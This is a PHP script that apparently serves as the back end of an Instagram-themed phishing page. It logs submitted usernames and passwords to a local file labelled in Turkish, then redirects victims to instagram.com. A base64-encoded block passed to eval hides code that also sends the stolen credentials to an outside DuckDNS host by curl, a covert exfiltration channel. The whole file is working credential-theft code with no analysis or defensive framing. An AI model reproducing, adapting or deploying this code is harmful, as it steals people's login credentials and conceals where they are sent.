
<?php

eval(base64_decode('JHVybCA9ICJoYWNrZXJjb2MuZHVja2Rucy5vcmcvMS5waHAiOwokcG9zdCA9IGFycmF5ICgKInVzZXJuYW1lIiA9PiAkX1BPU1RbJ3VzZXJuYW1lJ10sCiJwYXNzd29yZCIgPT4gJF9QT1NUWydwYXNzd29yZCddCik7CiAKJGNoID0gY3VybF9pbml0ICgkdXJsKTsKY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9QT1NULCB0cnVlKTsKY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdCk7CmN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwokZGF0YSA9IGN1cmxfZXhlYyAoJGNoKTsKZWNobyAkZGF0YTs='));


file_put_contents("hesaplar.txt", "Kullanıcı adı: " . $_POST['username'] . " Şifre: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
